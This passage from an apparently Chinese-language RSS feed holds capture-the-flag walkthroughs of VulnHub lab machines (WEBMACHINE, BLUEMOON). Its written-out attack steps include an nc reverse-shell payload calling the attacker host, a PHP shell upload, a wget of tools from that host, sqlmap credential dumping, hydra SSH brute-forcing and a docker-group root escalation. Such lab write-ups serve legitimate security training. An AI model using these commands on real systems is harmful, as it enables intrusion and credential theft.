target_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQlRTIlODAlOUQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4”&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-517.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行反弹 shell 的命令，调用系统去在 /tmp 里边写一个文件，用来反弹&lt;br&gt;
 payload += ‘system (“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135 4444 &amp;gt;/tmp/f”);’&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-518.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行此 exp，得到一个 url 地址，是用来触发命令的链接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-519.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听 kali 机器上的 4444 端口，同时访问该 url 地址使得命令被执行，得到反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-520.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;紧接着用python3 拿到一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-521.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pspy64-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64-监控&#34;&gt;#&lt;/a&gt; pspy64 监控&lt;/h3&gt;
&lt;p&gt;翻阅目录时并没有找到敏感文件，直接上传一个 pspy&lt;br&gt;
 监控靶机上有没有定期执行一些需要高权限才能执行的命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-522.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到有个计划任务被执行，查看后发现其中有一串 base64 加密数据，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-523.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 解密后发现是 root 的密码，su root 提权成功&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/117%20WEBMACHINE/</guid>
            <title>VULNHUB 17 WEBMACHINE</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/117%20WEBMACHINE/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2ViLW1hY2hpbmUtbjcsNzU2Lw==&#34;&gt;https://www.vulnhub.com/entry/web-machine-n7,756/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3RodXNreWJsb2cvcC8xNjAyNzk0Ni5odG1s&#34;&gt;https://www.cnblogs.com/wthuskyblog/p/16027946.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 WEBMACHINE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-362.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.98&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.98&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-363.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5Lw==&#34;&gt;http://192.168.31.109/&lt;/span&gt; 进行信息收集，一个欢迎界面，审查源代码没有什么新发现，先对目标网站进行目录扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-364.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描目录  &lt;code&gt;dirserch -u http://192.168.31.98/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-365.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.98/enter_network -x php,txt,html,zip,rar&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-366.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 识别到了一个敏感目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZXhwbG9pdC5odG1s&#34;&gt;http://192.168.31.98/exploit.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-367.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现一个文件上传漏洞的页面，审查源代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-368.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;文件上传后，页面会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9wcm9maWxlLnBocA==&#34;&gt;http://127.0.0.1/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;伪造html界面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造html界面&#34;&gt;#&lt;/a&gt; 伪造 html 界面&lt;/h3&gt;
&lt;p&gt;伪造一个 html 界面，改变跳转的链接如下，使上传文件的地址到:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=&#34;&gt;http://192.168.31.98/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;开启本地的 python 简易服务器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-369.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h3&gt;
&lt;p&gt;登陆伪造的 html 界面，点击上传文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-370.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 kali 自带的 php 反弹 shell 代码修改 ip 和端口号&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-371.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击选择文件，讲 shell.php 文件上传到目标网站&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-372.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;上传完成之后，页面重定向到了 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=&#34;&gt;http://192.168.31.98/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-373.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到了一半的 flag&lt;/p&gt;
&lt;p&gt;目前得到的信息再无可利用的可能，需要更多的信息，但是不管加载多大的字典，都没有扫出来新的目录，通过查相关教程，发现这里隐藏了一个 enter_network 的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-374.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==&#34;&gt;http://192.168.31.98/enter_network&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;单点登录测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#单点登录测试&#34;&gt;#&lt;/a&gt; 单点登录测试&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-375.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意到这是一个单点登录的地方，可能存在 sql 注入，也有可能会有 xss 漏洞，弱口令登陆等漏洞，这里简单尝试了一下没有发现有弱口令，尝试对这个目录再次进行目录扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-376.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 扫描一个重要的目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=&#34;&gt;http://192.168.31.98/enter_network/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改cookie登陆后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改cookie登陆后台&#34;&gt;#&lt;/a&gt; 修改 cookie 登陆后台&lt;/h3&gt;
&lt;p&gt;但是此页面只是 admin 的入口，查看网页是否存储了 cookie 的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-377.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到这里的角色是一串加密数据，是 base64 加密，其中 %253D 相当于 =&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-378.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;role 解密后的数据是采用的 md5 加密，继续用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NtZDUuY29t&#34;&gt;cmd5.com&lt;/span&gt; 解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-379.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;user 解密后的数据仍然是一个更加复杂的加密方式，这个加密暂时无法破解&lt;/p&gt;
&lt;p&gt;-&amp;gt; role 解密后的数据最终显示为 admin, 修改存储在 cookie 中的值为 admin&lt;/p&gt;
&lt;p&gt;再次访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=&#34;&gt;http://192.168.31.98/enter_network/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-380.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 于此，便得到了另外一半的 flag 的值&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-指定数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-指定数据包&#34;&gt;#&lt;/a&gt; sqlmap 指定数据包&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==&#34;&gt;http://192.168.31.98/enter_network&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-381.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个页面是可能产生 sql 注入的，通过 burp 抓取数据包，讲数据包保存到本地文件 sqlmap.txt 如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-382.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch --dbs&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-383.png&#34; width=&#34;280&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到有四个数据库名&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-测试数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-测试数据库&#34;&gt;#&lt;/a&gt; sqlmap 测试数据库&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine --tables&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-384.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Machine 数据库中有 login 的表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login --columns&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-385.png&#34; width=&#34;190&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;login 表下有 username,password,role 三个列&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-386.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;三个列里边分别有下面三个字段，同时也拿到了 flag&lt;/p&gt;
&lt;p&gt;尝试反弹 shell，通过 os-shell 失败，没有可写入的文件，但是可以通过下面的命令直接调用出 sql 语句，进行查表&lt;br&gt;
 &lt;code&gt;sqlmap -r sqlmap.txt --sql-shell&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-386.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机结束&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/128%20BLUEMOON/</guid>
            <title>VULNHUB 28 BLUEMOON</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/128%20BLUEMOON/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv&#34;&gt;https://www.vulnhub.com/entry/bluemoon-2021,679/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=&#34;&gt;https://www.jianshu.com/p/5d5b7f2d20e4&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-702.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-703.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;ftp-弱口令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令&#34;&gt;#&lt;/a&gt; FTP 弱口令&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-704.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看源代码，发现一个图片的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-705.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看样子是一个蓝色的月球，但是这个图片没什么作用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-706.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先尝试从 ftp 进行突破 &lt;code&gt;ftp 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-707.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试弱口令登陆失败，接下来对 80 网站进行目录扫描&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python3 dirmap.py -i http://192.168.0.153 -lcf&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-708.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-709.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 dirbuster 中的 directory 字典扫出来了一个目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=&#34;&gt;http://192.168.0.153/hidden_text&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-710.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看源代码，看能否有更多的发现，找到了一个隐藏的图片&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-711.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问得到了一个 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n&#34;&gt;http://192.168.0.153/.QR_C0d3.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-712.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linux-识别二维码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-识别二维码&#34;&gt;#&lt;/a&gt; linux 识别二维码&lt;/h3&gt;
&lt;p&gt;用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息&lt;/p&gt;
&lt;p&gt;下载到 kali 机器上，并修改文件名字为 qr.png:  &lt;code&gt;wget http://192.168.0.153/.QR_C0d3.png -O qr.png&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-713.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Linux 下可以用 zbarimg 来识别二维码&lt;br&gt;
 &lt;code&gt;zbarimg x.png&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-714.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到了 ftp 的账户和密码 ftp:ftpp@ssword&lt;/p&gt;
&lt;h3 id=&#34;ftp-信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-信息收集&#34;&gt;#&lt;/a&gt; FTP 信息收集&lt;/h3&gt;
&lt;p&gt;登陆到 ftp 服务器查看存在 ftp 中的有哪些文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-715.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 ftp 服务中的资料下载到本地查看内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-716.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-717.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码&lt;br&gt;
 &lt;code&gt;hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-718.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 ssh 命令成功登陆到了靶机中&lt;br&gt;
 &lt;code&gt;ssh 192.168.0.153 -l robin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-719.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;docker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-提权&#34;&gt;#&lt;/a&gt; docker 提权&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;  查看有无权限设置错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-720.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现可以以 jerry 的身份执行这个脚本  &lt;code&gt;sudo -u jerry /home/robin/project/feedback.sh&lt;/code&gt; &lt;br&gt;
 执行后，输入两个 bash，拿到了 jerry 的权限&lt;/p&gt;
&lt;p&gt;用 python3 调整为一个比较美观的终端: &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-721.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;的时候发现属于docker组，尝试用docker提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整shell输出比较美观的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-722.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</guid>
            <title>VULNHUB 29 PRESIDENTIAL</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==&#34;&gt;https://www.vulnhub.com/entry/presidential-1,500/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
